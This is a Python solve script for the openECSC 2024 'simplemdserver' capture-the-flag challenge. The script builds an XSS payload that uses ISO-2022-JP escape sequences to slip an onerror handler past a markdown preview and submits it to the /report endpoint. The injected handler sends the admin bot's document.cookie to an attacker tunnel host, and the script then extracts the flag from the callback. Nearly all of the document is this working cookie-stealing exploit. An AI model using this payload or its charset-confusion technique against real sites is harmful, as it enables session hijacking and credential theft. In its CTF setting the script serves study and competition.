#!/usr/bin/env python3

import logging
import os
import re
import requests
import tunnel

logging.disable()

URL = os.environ.get("URL", "http://simplemdserver.challs.open.ecsc2024.it:47008")
if URL.endswith("/"):
    URL = URL[:-1]

with tunnel.open_http_tunnel() as t:
    hook_url = f"http://{t.remote_host}:{t.remote_port}"

    payload = URL + '/preview?x=aaa%1B(Baaaaa' + 'a%1B$@!2%1B(B' * 200 + f'''aaaaa%1B(B ![img%1B$@!](file://a)%1B(B ![red]( onerror=location.assign('{hook_url}?'%26%2343;document.cookie) )wwwww'''
    r = requests.post(URL + '/report', data=payload.encode())
    print(r.text)

    _, path, _, _ = t.wait_request()
    t.send_response(200, {}, b'')

    assert 'flag' in path

    m = re.search(r'(openECSC|flag)\{.+\}', path)
    print(m.group(0))
